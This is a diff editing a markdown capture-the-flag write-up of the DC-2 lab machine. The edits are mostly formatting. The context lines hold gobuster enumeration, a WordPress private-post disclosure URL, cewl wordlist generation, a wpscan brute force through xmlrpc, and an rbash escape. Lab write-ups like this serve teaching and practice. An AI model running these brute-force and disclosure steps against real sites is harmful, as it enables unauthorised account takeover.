@@ -25,7 +25,7 @@ Nmap done: 1 IP address (1 host up) scanned in 7.37 seconds
 ```
 
 ### gobuster
-Using `gobuster to look for hidden files on the identified web server.`
+Using `gobuster` to look for hidden files on the identified web server.
 
 ```bash
 gobuster dir -u http://dc-2/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -t 10 -x php -b 404,403
@@ -70,9 +70,9 @@ It seems that `wordpress` is installed on the web server.
 ---
 
 ## exploitation
+### wordpress
 Looking for exploits against `wordpress 4.7.10`
 
-### wordpress
 ```bash
 searchsploit wordpress Core 4.7
 ---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -88,8 +88,8 @@ WordPress Core < 5.3.x - 'xmlrpc.php' Denial of Service                         
 ---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
 ```
-`WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts ` looks promising  
-`http://dc-2/?static=1&order=asc` reveals the "secret" content  
+- `WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts ` looks promising  
+- `http://dc-2/?static=1&order=asc` reveals the "secret" content  
 Site gives the hint that `cewl` might be a good idea. `cewl` generates custom wordlists it scrapes from the website you provide.  
 
 ```bash
@@ -97,7 +97,7 @@ cewl -d 2 -w ourWordlist.txt "http://dc-2/?static=1&order=asc"
 ```
 
 Then we are using `wpscan` to identify accounts on the `wordpress` site and perform a brute force attack with the generated wordlist.  
-We are using xmlrpc endpoint here instead of the "normal" login page, because in this way we can perform multiple login attemps with one xml-rpc call.
+We are using the xmlrpc endpoint here instead of the "normal" login page, because in this way we can perform multiple login attemps with one xml-rpc call.
 
 ```bash
 wpscan --url http://dc-2/ --password-attack xmlrpc -P /home/void/Documents/web200/playgrounds/dc2/ourWordlist.txt                                                      
@@ -156,7 +156,8 @@ tom@DC-2:~$ cat local.txt
 -rbash: cat: command not found
 ```
 
-`rbash` is in place and the program `cat` cannot be found.
+`rbash` is in place and the program `cat` cannot be found.  
+`rbash` is a restricted shell which is used to 'jail' a user, so he cannot execute certain commands and act as a normal user.
 
 ### escaping rbash
 ```bash
@@ -211,4 +212,6 @@ final-flag.txt  proof.txt
 # less proof.txt
 6a95123938cbf5b**********c984587
 ```
--> `6a95123938cbf5b**********c984587`
+-> `6a95123938cbf5b**********c984587`  
+  
+Pwned! <@:-)
